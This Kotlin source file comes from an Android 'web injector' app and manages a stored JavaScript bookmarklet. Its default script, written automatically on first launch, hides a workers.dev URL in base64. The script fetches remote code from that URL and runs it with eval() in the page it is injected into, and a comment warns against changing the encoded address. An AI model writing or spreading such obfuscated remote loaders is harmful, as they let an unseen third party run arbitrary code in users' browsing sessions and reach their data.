package com.fahim.webinjector

import android.content.Context
import android.content.SharedPreferences

/**
 * Manages persistent storage of the user-editable JavaScript bookmarklet.
 * Default script is restored on first launch or when the user chooses Reset.
 */
class ScriptManager(context: Context) {

    companion object {
        private const val PREFS_NAME = "fahim_web_injector_prefs"
        private const val KEY_SCRIPT = "javascript_bookmarklet"
        private const val KEY_INITIALIZED = "script_initialized"

        // Exact default bookmarklet provided by the user (do not modify the encoded URL)
        const val DEFAULT_SCRIPT =
            "javascript:(function(){window.ZXI_BOOKMARK_LOAD=true;var a=['aHR0cHM6Ly96eGktZmlsZS1sb2FkZXIuYWg0NzM0NTM2LndvcmtlcnMuZGV2Lz9maWxlPXNjcmlwdC5qcw=='];fetch(atob(a[0])+'&t='+Date.now().toString(36)).then(r=>r.text()).then(t=>eval(t)).catch(()=>alert('Failed'));})();"
    }

    private val prefs: SharedPreferences =
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)

    init {
        // Ensure default is written on very first launch
        if (!prefs.getBoolean(KEY_INITIALIZED, false)) {
            saveScript(DEFAULT_SCRIPT)
            prefs.edit().putBoolean(KEY_INITIALIZED, true).apply()
        }
    }

    fun getScript(): String {
        return prefs.getString(KEY_SCRIPT, DEFAULT_SCRIPT) ?: DEFAULT_SCRIPT
    }

    fun saveScript(script: String) {
        prefs.edit().putString(KEY_SCRIPT, script.trim()).apply()
    }

    fun resetToDefault() {
        saveScript(DEFAULT_SCRIPT)
    }

    fun isDefault(): Boolean {
        return getScript() == DEFAULT_SCRIPT
    }
}
